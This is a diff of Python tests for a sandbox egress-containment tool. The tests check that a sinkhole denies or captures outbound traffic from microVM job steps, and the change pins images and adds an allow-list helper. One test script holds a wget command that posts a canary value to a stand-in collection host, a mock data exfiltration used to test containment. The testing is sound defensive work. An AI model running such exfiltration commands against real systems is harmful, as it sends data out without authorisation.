@@ -5,7 +5,6 @@ Unit tests talk to the sinkhole over loopback. Integration tests run real microV
 """
 import hashlib
 import os
-import shutil
 import socket
 import struct
 import subprocess
@@ -13,6 +12,7 @@ import threading
 import time
 import unittest
 
+from helpers import allow, msb_available, pinned
 from pqproof.egress import SINK_CIDR, Sinkhole, nxdomain
 from pqproof.sandbox import MSB, Limits, Runner
 
@@ -81,7 +81,8 @@ class EveryStepIsDenied(unittest.TestCase):
         def fake(argv, timeout=None):
             calls.append(argv)
             return subprocess.CompletedProcess(argv, 0, "[]", "")
-        Runner(run=fake, **runner_kwargs).run_step("j", "s", "alpine", ["true"])
+        img = "alpine@sha256:" + "0" * 64
+        Runner(run=fake, **runner_kwargs).run_step(allow(img, ["true"]), "j", "s", img, ["true"])
         return calls[0]
 
     def test_without_sinkhole_everything_is_denied(self):
@@ -92,11 +93,7 @@ class EveryStepIsDenied(unittest.TestCase):
     def test_with_sinkhole(self):
         with Sinkhole() as sink:
             argv = self.create_argv({"egress": sink})
-            self.assertEqual(argv[-1 - len(sink.msb_args()):-1], sink.msb_args())
-
-
-def msb_available():
-    return os.environ.get("PQPROOF_MSB_TESTS", "1") != "0" and shutil.which(MSB) is not None
+            self.assertEqual(argv[-2 - len(sink.msb_args()):-2], sink.msb_args())
 
 
 class FakeControlPlane:
@@ -123,11 +120,14 @@ class FakeControlPlane:
 
 @unittest.skipUnless(msb_available(), "msb not installed")
 class RealEgress(unittest.TestCase):
-    IMAGE = "alpine"
-
     @classmethod
     def setUpClass(cls):
-        subprocess.run([MSB, "pull", "-q", cls.IMAGE], check=True, capture_output=True, timeout=300)
+        cls.IMAGE = pinned("alpine")
+
+    def step(self, sink, script, wall=60):
+        argv = ["sh", "-c", script]
+        return Runner(egress=sink).run_step(allow(self.IMAGE, argv), "itest", "egress", self.IMAGE, argv,
+                                            Limits(memory_mib=256, wall_clock_s=wall))
 
     def test_containment(self):
         api = FakeControlPlane()
@@ -140,8 +140,7 @@ wget -q -T 4 -O- --post-data canary=CANARY-0001 http://203.0.113.7/collect >/dev
 """
         try:
             with Sinkhole() as sink:
-                res = Runner(egress=sink).run_step("itest", "egress", self.IMAGE, ["sh", "-c", script],
-                                                   Limits(memory_mib=256, wall_clock_s=60))
+                res = self.step(sink, script)
                 wait_for(lambda: len(sink.canaries()) >= 2)
                 canaries, events = sink.canaries(), list(sink.events)
         finally:
